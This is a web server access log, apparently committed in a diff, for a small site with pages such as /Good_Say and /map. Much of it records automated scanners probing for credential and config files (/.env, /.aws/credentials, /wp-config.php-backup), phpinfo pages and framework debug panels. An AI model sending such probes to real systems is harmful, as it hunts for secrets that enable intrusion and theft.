+85.209.135.110 - - [08/Dec/2022 10:21:21] "POST /sapi/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:22] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:22] "GET /phpinfo HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:23] "POST / HTTP/1.1" 405 -
+85.209.135.110 - - [08/Dec/2022 10:21:23] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:24] "POST /tool/view/phpinfo.view.php HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:24] "POST /wp-config.php-backup HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:25] "POST /%C0 HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:25] "POST /debug/default/view.html HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:26] "POST /debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:26] "POST /frontend/web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:27] "POST /web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:27] "POST /sapi/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:28] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:28] "GET /aws.yml HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:29] "POST / HTTP/1.1" 405 -
+85.209.135.110 - - [08/Dec/2022 10:21:30] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:30] "POST /tool/view/phpinfo.view.php HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:31] "POST /wp-config.php-backup HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:31] "POST /%C0 HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:32] "POST /debug/default/view.html HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:32] "POST /debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:33] "POST /frontend/web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:33] "POST /web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:34] "POST /sapi/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:34] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:35] "GET /.env.bak HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:35] "POST / HTTP/1.1" 405 -
+85.209.135.110 - - [08/Dec/2022 10:21:36] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:36] "POST /tool/view/phpinfo.view.php HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:37] "POST /wp-config.php-backup HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:37] "POST /%C0 HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:38] "POST /debug/default/view.html HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:38] "POST /debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:39] "POST /frontend/web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:39] "POST /web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:40] "POST /sapi/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:40] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:40] "GET /info.php HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:41] "POST / HTTP/1.1" 405 -
+85.209.135.110 - - [08/Dec/2022 10:21:41] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:42] "POST /tool/view/phpinfo.view.php HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:42] "POST /wp-config.php-backup HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:43] "POST /%C0 HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:43] "POST /debug/default/view.html HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:44] "POST /debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:44] "POST /frontend/web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:45] "POST /web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:45] "POST /sapi/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:46] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:46] "GET /.aws/credentials HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:47] "POST / HTTP/1.1" 405 -
+85.209.135.110 - - [08/Dec/2022 10:21:47] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:48] "POST /tool/view/phpinfo.view.php HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:48] "POST /wp-config.php-backup HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:49] "POST /%C0 HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:49] "POST /debug/default/view.html HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:50] "POST /debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:50] "POST /frontend/web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:51] "POST /web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:51] "POST /sapi/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:52] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:52] "GET /config/aws.yml HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:53] "POST / HTTP/1.1" 405 -
+85.209.135.110 - - [08/Dec/2022 10:21:53] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:54] "POST /tool/view/phpinfo.view.php HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:54] "POST /wp-config.php-backup HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:55] "POST /%C0 HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:55] "POST /debug/default/view.html HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:56] "POST /debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:56] "POST /frontend/web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:57] "POST /web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:57] "POST /sapi/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:58] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:58] "GET /config.js HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:59] "POST / HTTP/1.1" 405 -
+85.209.135.110 - - [08/Dec/2022 10:21:59] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:00] "POST /tool/view/phpinfo.view.php HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:00] "POST /wp-config.php-backup HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:01] "POST /%C0 HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:01] "POST /debug/default/view.html HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:02] "POST /debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:02] "POST /frontend/web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:03] "POST /web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:03] "POST /sapi/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:04] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:05] "GET /symfony/public/_profiler/phpinfo HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:05] "POST / HTTP/1.1" 405 -
+85.209.135.110 - - [08/Dec/2022 10:22:06] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:06] "POST /tool/view/phpinfo.view.php HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:07] "POST /wp-config.php-backup HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:07] "POST /%C0 HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:08] "POST /debug/default/view.html HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:08] "POST /debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:09] "POST /frontend/web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:09] "POST /web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:10] "POST /sapi/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:10] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:11] "GET /symfony/public/_profiler/phpinfo HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:11] "POST / HTTP/1.1" 405 -
+85.209.135.110 - - [08/Dec/2022 10:22:12] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:12] "POST /tool/view/phpinfo.view.php HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:13] "POST /wp-config.php-backup HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:13] "POST /%C0 HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:14] "POST /debug/default/view.html HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:14] "POST /debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:15] "POST /frontend/web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:15] "POST /web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:16] "POST /sapi/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:16] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:17] "GET /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:17] "POST / HTTP/1.1" 405 -
+85.209.135.110 - - [08/Dec/2022 10:22:18] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:18] "POST /tool/view/phpinfo.view.php HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:19] "POST /wp-config.php-backup HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:19] "POST /%C0 HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:20] "POST /debug/default/view.html HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:20] "POST /debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:21] "POST /frontend/web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:21] "POST /web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:22] "POST /sapi/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:22:22] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+183.96.80.196 - - [08/Dec/2022 11:08:24] "GET / HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 11:08:24] "GET /static/css/reset.css HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 11:08:24] "GET /static/css/style.css HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 11:08:25] "GET /static/js/index.js HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 11:08:25] "GET /static/assets/search.png HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 11:08:25] "GET /static/assets/like.png HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 11:08:25] "GET /static/assets/story_img1.png HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 11:08:25] "GET /static/assets/mypage.png HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 11:08:25] "GET /static/assets/menu/american/steak.png HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 11:08:25] "GET /static/assets/call.png HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 11:08:25] "GET /static/assets/house.svg HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 11:08:25] "GET /static/assets/house.svg HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:08:26] "GET /Good_Say HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 11:08:32] "GET /write/2 HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 11:08:32] "GET /static/css/reset.css HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:08:32] "GET /static/css/style.css HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:08:32] "GET /static/css/write2style.css HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 11:08:32] "GET /static/assets/search.png HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:08:32] "GET /static/assets/like.png HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:08:32] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:08:32] "GET /Login?loc%20=%20write/2 HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 11:08:33] "GET /static/css/Login.css HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 11:08:33] "GET /favicon.ico HTTP/1.1" 404 -
+183.96.80.196 - - [08/Dec/2022 11:08:36] "GET / HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 11:08:36] "GET /static/css/reset.css HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:08:36] "GET /static/css/style.css HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:08:36] "GET /static/js/index.js HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:08:36] "GET /static/assets/search.png HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:08:36] "GET /static/assets/like.png HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:08:36] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:08:36] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:08:36] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:08:36] "GET /static/assets/call.png HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:08:36] "GET /static/assets/house.svg HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:08:36] "GET /static/assets/house.svg HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:08:36] "GET /Good_Say HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 11:08:37] "GET /map HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 11:08:37] "GET /static/css/header.css HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 11:08:37] "GET /static/css/map.css HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 11:08:37] "GET /static/css/reset.css HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:08:37] "GET /static/assets/like2.png HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 11:08:37] "GET /static/assets/mypage2.png HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 11:08:37] "GET /static/assets/search2.png HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 11:08:46] "GET / HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 11:08:47] "GET /static/css/style.css HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:08:47] "GET /static/css/reset.css HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:08:47] "GET /static/js/index.js HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:08:47] "GET /static/assets/search.png HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:08:47] "GET /static/assets/like.png HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:08:47] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:08:47] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:08:47] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:08:47] "GET /static/assets/call.png HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:08:47] "GET /static/assets/house.svg HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:08:47] "GET /static/assets/house.svg HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:08:47] "GET /Good_Say HTTP/1.1" 200 -
+135.125.246.110 - - [08/Dec/2022 11:37:46] "POST / HTTP/1.1" 405 -
+135.125.246.110 - - [08/Dec/2022 11:37:46] "GET /.env HTTP/1.1" 404 -
+183.96.80.196 - - [08/Dec/2022 11:39:33] "GET /static/css/style.css HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:39:33] "GET /static/css/reset.css HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:39:33] "GET /static/js/index.js HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:39:33] "GET /static/assets/like.png HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:39:33] "GET /static/assets/search.png HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:39:33] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:39:33] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:39:33] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:39:33] "GET /static/assets/call.png HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 11:39:34] "GET /Good_Say HTTP/1.1" 200 -
+148.153.45.237 - - [08/Dec/2022 11:41:53] "GET /XIbY HTTP/1.1" 404 -
+148.153.45.237 - - [08/Dec/2022 11:41:53] "GET /Mtd8 HTTP/1.1" 404 -
+148.153.45.237 - - [08/Dec/2022 11:41:53] "GET /aab8 HTTP/1.1" 404 -
+148.153.45.237 - - [08/Dec/2022 11:41:53] "GET /jquery-3.3.1.slim.min.js HTTP/1.1" 404 -
+148.153.45.237 - - [08/Dec/2022 11:41:54] "GET /aab9 HTTP/1.1" 404 -
+148.153.45.237 - - [08/Dec/2022 11:41:54] "GET /jquery-3.3.2.slim.min.js HTTP/1.1" 404 -
+135.125.246.110 - - [08/Dec/2022 12:35:26] "POST / HTTP/1.1" 405 -
+135.125.246.110 - - [08/Dec/2022 12:35:26] "GET /.env HTTP/1.1" 404 -
+183.96.80.196 - - [08/Dec/2022 12:36:19] "GET /static/css/reset.css HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 12:36:19] "GET /static/css/style.css HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 12:36:20] "GET /static/js/index.js HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 12:36:20] "GET /static/assets/search.png HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 12:36:20] "GET /static/assets/like.png HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 12:36:20] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 12:36:20] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 12:36:20] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 12:36:21] "GET /static/assets/call.png HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 12:36:22] "GET /Good_Say HTTP/1.1" 200 -
+192.241.206.232 - - [08/Dec/2022 12:53:24] "GET / HTTP/1.1" 200 -
+185.254.196.115 - - [08/Dec/2022 13:36:56] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [08/Dec/2022 13:36:56] "POST / HTTP/1.1" 405 -
+45.79.181.179 - - [08/Dec/2022 13:56:13] code 400, message Bad request version ('À\x14À')
+45.79.181.179 - - [08/Dec/2022 13:56:13] "   :¨,cîð0)å2·ûKiÏ¿½PdU÷jï@MT£   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+198.235.24.144 - - [08/Dec/2022 13:56:45] "GET / HTTP/1.1" 200 -
+135.125.246.110 - - [08/Dec/2022 14:15:19] "POST / HTTP/1.1" 405 -
+135.125.246.110 - - [08/Dec/2022 14:15:20] "GET /.env HTTP/1.1" 404 -
+34.76.158.233 - - [08/Dec/2022 15:04:23] "GET / HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 15:04:38] "GET / HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 15:04:39] "GET /static/css/reset.css HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 15:04:39] "GET /static/css/style.css HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 15:04:39] "GET / HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 15:04:39] "GET /static/js/index.js HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 15:04:39] "GET /static/css/reset.css HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 15:04:39] "GET /static/css/style.css HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 15:04:40] "GET /static/js/index.js HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 15:04:40] "GET /static/assets/like.png HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 15:04:40] "GET /static/assets/story_img1.png HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 15:04:40] "GET /static/assets/search.png HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 15:04:40] "GET /static/assets/mypage.png HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 15:04:40] "GET /static/assets/menu/american/steak.png HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 15:04:40] "GET /static/assets/call.png HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 15:04:41] "GET /static/assets/house.svg HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 15:04:41] "GET /static/assets/house.svg HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:04:41] "GET /Good_Say HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 15:05:11] "GET / HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 15:05:11] "GET /static/css/style.css HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:05:11] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:05:11] "GET /static/js/index.js HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:05:11] "GET /static/assets/search.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:05:11] "GET /static/assets/like.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:05:11] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:05:11] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:05:11] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:05:11] "GET /static/assets/call.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:05:11] "GET /static/assets/house.svg HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:05:11] "GET /static/assets/house.svg HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:05:11] "GET /Good_Say HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 15:05:29] "GET / HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 15:05:29] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:05:29] "GET /static/css/style.css HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:05:30] "GET /static/js/index.js HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:05:30] "GET /static/assets/search.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:05:30] "GET /static/assets/like.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:05:30] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:05:30] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:05:30] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:05:30] "GET /static/assets/call.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:05:30] "GET /Good_Say HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 15:05:30] "GET /static/assets/house.svg HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:05:30] "GET /static/assets/house.svg HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:06:20] "GET / HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 15:06:20] "GET /static/css/style.css HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:06:20] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:06:20] "GET /static/js/index.js HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:06:20] "GET /static/assets/search.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:06:20] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:06:20] "GET /static/assets/like.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:06:20] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:06:20] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:06:20] "GET /static/assets/call.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:06:21] "GET /Good_Say HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 15:06:21] "GET /static/assets/house.svg HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:06:21] "GET /static/assets/house.svg HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:06:23] "GET / HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 15:06:23] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:06:23] "GET /static/css/style.css HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:06:23] "GET /static/js/index.js HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:06:23] "GET /static/assets/search.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:06:23] "GET /static/assets/like.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:06:23] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:06:23] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:06:23] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
